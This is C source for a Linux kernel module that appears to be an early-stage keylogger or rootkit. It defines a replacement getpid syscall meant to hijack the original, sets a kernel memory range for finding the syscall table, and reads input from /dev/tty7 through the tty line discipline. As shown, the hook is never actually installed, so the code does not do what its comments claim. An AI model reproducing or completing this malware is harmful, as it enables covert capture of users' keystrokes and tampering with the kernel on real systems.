#include <linux/init.h> // required for module_init/exit
#include <linux/module.h> // required for module development
#include <linux/kernel.h> // since we're dealing with the kerne
#include <linux/errno.h> // not too sure about this
#include <linux/unistd.h> // we're messing with syscalls
#include <linux/syscalls.h> // same as above
#include <linux/tty.h>
#include <linux/fs.h>
#include "headers/kfile.h" // file operations

// this file, as it stands, is just a proof of concept. It doesn't
// keylog anything, it just hijacks the getpid syscall.

// these memory locations are specific to 32-bit systems
#define START_MEM 0xc0000000
#define END_MEM 0xd0000000

// a module license is required for most modules to run
MODULE_LICENSE("GPL");

// lets us make system calls within kernel
// this will point to the syscall_table
unsigned long *syscall_table;

// pointer to the original sys_getpid call. When we
asmlinkage long (*original_getpid)(void);

// our replacement sys_getpid
asmlinkage long new_getpid(void) {
  // hijacked getpid
  printk(KERN_ALERT "GETPID HIJACKED");
  // call the original function
  return original_getpid();
}

static int init(void) {
  // our structs
  struct tty_struct* tty = NULL;
  struct file* file = NULL;
  char* dev_name = "/dev/tty7";

  // open the tty
  file = kopen(dev_name,LF_FLAGS,LF_PERMS);
  if(file){
    printk(KERN_ALERT "tty was opened\n");
    struct tty_file_private* priv = NULL;
    priv = file->private_data;
    if(priv) tty=priv->tty;
    if(tty){
      printk(KERN_ALERT "this is a valid tty\n");
      if(tty->ldisc->ops->read){
	char buffer[256];
	size_t count = 1;
	(tty->ldisc->ops->read)(tty,file,buffer,count);
	printk(KERN_ALERT "contents = %c %x\n",buffer[0],buffer[0]);
      }
    }
  }
  kclose(file);
  return 0;
}
	 
static void exit(void) {
}

// sets our custom functions as the init and exit functions
module_init(init);
module_exit(exit);
